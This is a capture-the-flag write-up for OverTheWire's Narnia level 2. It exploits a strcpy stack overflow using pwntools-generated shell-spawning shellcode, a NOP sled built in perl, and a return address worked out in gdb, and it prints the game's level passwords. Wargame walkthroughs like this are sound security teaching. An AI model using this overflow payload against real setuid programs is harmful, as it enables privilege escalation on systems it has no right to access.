# Narnia 2


## Overview

-----------------
On the OverTheWire/Leviathan website, we are told how connecting to the bandit server as a specific user works.

Each user corresponds to a different level:
- Narnia0 -> Level 0
- Narnia1 -> Level 1
- ...
- Narnia33 -> Level 33

Each level is hiding a flag, which is used as the password for the following level. Meaning, one must solve `Level n` to play `Level n+1`.

We always start out connecting to the `narnia.labs.overthewire.org` server on `port 2226` for each level.
Again, the users on the server specifies the level. Each starting point is the same:

``` text
➜  ~  ssh narnia2@narnia.labs.overthewire.org -p 2226
                                                _       
                         _ __   __ _ _ __ _ __ (_) __ _ 
                        | '_ \ / _` | '__| '_ \| |/ _` |
                        | | | | (_| | |  | | | | | (_| |
                        |_| |_|\__,_|_|  |_| |_|_|\__,_|
                                                        

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

narnia2@narnia.labs.overthewire.org's password: 
```

The password will always be the flag of the previous level. With the exception of Level 0, where the password is `narnia0`.


## Connecting

--------------

We can establish a connection with the server via ssh, and using the password `Zzb6MIyceT`:

``` text
➜  ~  ssh narnia2@narnia.labs.overthewire.org -p 2226
                                                _       
                         _ __   __ _ _ __ _ __ (_) __ _ 
                        | '_ \ / _` | '__| '_ \| |/ _` |
                        | | | | (_| | |  | | | | | (_| |
                        |_| |_|\__,_|_|  |_| |_|_|\__,_|
                                                        

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

narnia2@narnia.labs.overthewire.org's password: Zzb6MIyceT

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

<snip>

  Enjoy your stay!

narnia2@gibson:~$ 
```

## Looking Around

--------------

Let's just `cat` the script for this level:


``` text
narnia2@gibson:/narnia$ cat narnia2.c 
<snip>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
narnia2@gibson:/narnia$
```

Arlight. Right off the bat we can see that we have a char array that has a capacity of 127 chars (127 chars + 1 `\x00` array deliminator).
We are also using `strcpy()` to copy the contents of `argv[1]` into the `buf` variable. After doing some research, 
we find that `strcpy()` is a big security vulnerability, as it doesn't check the size of the passed string to copy 
into the variable. 

If not properly checked, `strcpy()` can lead to memory leaks and buffer overflows. Let's test this:


``` text
narnia2@gibson:/narnia$ ./narnia2 $( python3 -c 'print("a"*128)' )
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
narnia2@gibson:/narnia$ ./narnia2 $( python3 -c 'print("a"*131)' )
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
narnia2@gibson:/narnia$ ./narnia2 $( python3 -c 'print("a"*132)' )
Segmentation fault (core dumped)
narnia2@gibson:/narnia$ 
```

Hmm... even though the `buf` array can only hold 127 chars, we can add 131 chars before we get a segmentation fault.

These extra characters are the return-address of the function `strcpy()`, which specifies where to "return to" after 
`strcpy()` is done executing. 

If my understanding is correct, when we call a function in `main`, we move away from the main function, and are now working
in a different location of the stack. Once we are done with the called function, we return back to the main function
via the return address. In `main` we call the function and also set where to return to after function is done to execute 
the next lines of code in the main function. 

``` text
main                   /---> myFunc
------------------     |     ------------------
...                    |     ...
...                    |     ...
...                    |     ------------------
call myFunc            |
\----------------------|
return back here <-----/
...
...
------------------
```

`myFunc` doesn't handle the return address but rather, whatever calls the function in main handles the return address.
So, if we overflow the buffer in the `myFunc` function, we can potentially change the return address in the stack to point to 
somewhere else. 

> Perhaps a deep dive into how the stack works is appropriate.
> Maybe I should create a neural network in assembly? 


Now, after some more googling I came across something called **NOP Sled** which is essentially the hex equivalent to 
a slide at the amusement park. 

[NOP_sled.md](../extras/nop_sled.md)

Let's craft a shellcode using Python's `pwntools`

``` text
narnia2@gibson:/narnia$ python3
Python 3.10.12 (main, Jun 11 2023, 05:26:28) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> context.arch = 'i386'
>>> context.os = 'linux'
>>> context.endian = 'little'
>>> context.word_size = 32
>>> shellcode = asm(shellcraft.setreuid() + shellcraft.sh())
>>> enhex(shellcode)
'6a3158cd8089c36a465889d9cd806a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80'
>>> 
```

Now, we have our shellcode, which is `58 bytes` long. `128 - 58 = 70`.

We can convert this to the following:

``` text
perl -e 'print "\x90"x74 . "\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" . "\x00\x00\x00\x00";'
```

``` text
narnia2@gibson:/narnia$ ./narnia2 $( perl -e 'print "\x90"x74 . "\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" . "\xff\xff\xff\xff";' )
Segmentation fault (core dumped)
narnia2@gibson:/narnia$ 
```

Let's run `gdb` to figure out what to write for our return address.

``` text
narnia2@gibson:/narnia$ gdb ./narnia2
<snip>
(gdb) disassemble main
Dump of assembler code for function main:
   0x08049196 <+0>:	push   %ebp
   0x08049197 <+1>:	mov    %esp,%ebp
   0x08049199 <+3>:	add    $0xffffff80,%esp
   0x0804919c <+6>:	cmpl   $0x1,0x8(%ebp)
   0x080491a0 <+10>:	jne    0x80491bc <main+38>
   0x080491a2 <+12>:	mov    0xc(%ebp),%eax
   0x080491a5 <+15>:	mov    (%eax),%eax
   0x080491a7 <+17>:	push   %eax
   0x080491a8 <+18>:	push   $0x804a008
   0x080491ad <+23>:	call   0x8049050 <printf@plt>
   0x080491b2 <+28>:	add    $0x8,%esp
   0x080491b5 <+31>:	push   $0x1
   0x080491b7 <+33>:	call   0x8049070 <exit@plt>
   0x080491bc <+38>:	mov    0xc(%ebp),%eax
   0x080491bf <+41>:	add    $0x4,%eax
   0x080491c2 <+44>:	mov    (%eax),%eax
   0x080491c4 <+46>:	push   %eax
   0x080491c5 <+47>:	lea    -0x80(%ebp),%eax
   0x080491c8 <+50>:	push   %eax
   0x080491c9 <+51>:	call   0x8049060 <strcpy@plt>
   0x080491ce <+56>:	add    $0x8,%esp
   0x080491d1 <+59>:	lea    -0x80(%ebp),%eax
   0x080491d4 <+62>:	push   %eax
   0x080491d5 <+63>:	push   $0x804a01c
   0x080491da <+68>:	call   0x8049050 <printf@plt>
   0x080491df <+73>:	add    $0x8,%esp
   0x080491e2 <+76>:	mov    $0x0,%eax
   0x080491e7 <+81>:	leave  
   0x080491e8 <+82>:	ret    
End of assembler dump.
(gdb)
```

Set breakpoint after at `main+68`.


``` text
(gdb) break *0x080491da
Breakpoint 1 at 0x80491da
```

Let's run our command.

``` text
(gdb) run $( perl -e 'print "\x90"x74 . "\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" . "\xff\xff\xff\xff";' )
Starting program: /narnia/narnia2 $( perl -e 'print "\x90"x74 . "\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" . "\xff\xff\xff\xff";' )
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x080491da in main ()
(gdb) x/100x $esp+500
0xffffd694:	0x0000000a	0x00000007	0xf7fc6000	0x00000008
0xffffd6a4:	0x00000000	0x00000009	0x08049080	0x0000000b
0xffffd6b4:	0x000036b2	0x0000000c	0x000036b2	0x0000000d
0xffffd6c4:	0x000036b2	0x0000000e	0x000036b2	0x00000017
0xffffd6d4:	0x00000001	0x00000019	0xffffd70b	0x0000001a
0xffffd6e4:	0x00000002	0x0000001f	0xffffdfe8	0x0000000f
0xffffd6f4:	0xffffd71b	0x00000000	0x00000000	0x00000000
0xffffd704:	0x00000000	0xac000000	0x4f865e19	0x2165932d
0xffffd714:	0x8c1c67a6	0x69719f0d	0x00363836	0x00000000
0xffffd724:	0x2f000000	0x6e72616e	0x6e2f6169	0x696e7261
0xffffd734:	0x90003261	0x90909090	0x90909090	0x90909090
0xffffd744:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd754:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd764:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd774:	0x90909090	0x90909090	0x90909090	0x58316a90
0xffffd784:	0xc38980cd	0x8958466a	0x6a80cdd9	0x2f2f6868
0xffffd794:	0x2f68732f	0x896e6962	0x010168e3	0x34810101
0xffffd7a4:	0x01697224	0x51c93101	0x0159046a	0xe18951e1
0xffffd7b4:	0x0b6ad231	0xff80cd58	0x00ffffff	0x4c454853
0xffffd7c4:	0x622f3d4c	0x622f6e69	0x00687361	0x3d445750
0xffffd7d4:	0x72616e2f	0x0061696e	0x4e474f4c	0x3d454d41
0xffffd7e4:	0x6e72616e	0x00326169	0x752f3d5f	0x622f7273
0xffffd7f4:	0x672f6e69	0x4c006264	0x53454e49	0x0037343d
0xffffd804:	0x454d4f48	0x6f682f3d	0x6e2f656d	0x696e7261
0xffffd814:	0x4c003261	0x3d474e41	0x54552e43	0x00382d46
(gdb) 
```

We can see there is a lot of repition happening here:

``` text
0xffffd744:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd754:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd764:	0x90909090	0x90909090	0x90909090	0x90909090
```

Let's choose `0xffffd754` for our return address.

So our new command should be:

``` text
./narnia2 $( perl -e 'print <snip> "\x54\xd7\xff\xff";' )
```

Let's run it.


`$( perl -e 'print "\x90"x74 . "\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" . "\x54\xd7\xff\xff";' )`

``` text
narnia2@gibson:/narnia$ gdb ./narnia2
<snip>
(gdb) run $( perl -e 'print "\x90"x74 . "\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" . "\x54\xd7\xff\xff";' )
Starting program: /narnia/narnia2 $( perl -e 'print "\x90"x74 . "\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" . "\x54\xd7\xff\xff";' )
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
process 326380 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
$ whoami
[Detaching after vfork from child process 326459]
narnia2
```

BOOM we got a shell. However, because we are using `GDB` we are running the script as `narnia2`, which means we must
run the script without `GDB`. 

Additionally, `GDB` creates an **OFFSET** in the stack, which means we must use a different return address. Let's
check how much this offset is by printing the `$ESP` normally and then with `GDB`.

``` text
narnia2@gibson:~$ mktemp -d
/tmp/tmp.mblQrRlBU6
narnia2@gibson:~$ cd /tmp/tmp.mblQrRlBU6
narnia2@gibson:/tmp/tmp.mblQrRlBU6$ vim crack.c
narnia2@gibson:/tmp/tmp.mblQrRlBU6$ gcc crack.c -o crack
narnia2@gibson:/tmp/tmp.mblQrRlBU6$ ./crack 
0xffffe480 <= $ESP
narnia2@gibson:/tmp/tmp.mblQrRlBU6$ gdb ./crack
<snip>
(gdb) run
<snip>
0xffffe440 <= $ESP
(gdb) exit
```

Let's use `python` to check the difference.

``` text
narnia2@gibson:/tmp/tmp.mblQrRlBU6$ python3
<snip>
>>> hex(0xffffe480 - 0xffffe440)
'0x40'
>>> 
```

Okay. We have an offset of **POSITIVE** `0x40`, which means we add `0x40` to the return address we found in `GDB`.

``` text
narnia2@gibson:/tmp/tmp.mblQrRlBU6$ python3
<snip>
>>> hex(0xffffd754 + 0x40)
'0xffffd794'
>>> 
```

Let's craft the input argument using `perl`.

``` text
$( perl -e 'print "\x90"x74 . <snip> . "\x94\xd7\xff\xff";')
```

Let's run this in conjunction with `./narnia2` binary.

``` text
narnia2@gibson:/narnia$ ./narnia2 $( perl -e 'print "\x90"x74 . "\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" . "\x94\xd7\xff\xff";')
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
8SyQ2wyEDU
$
```

BOOM we got the flag. 

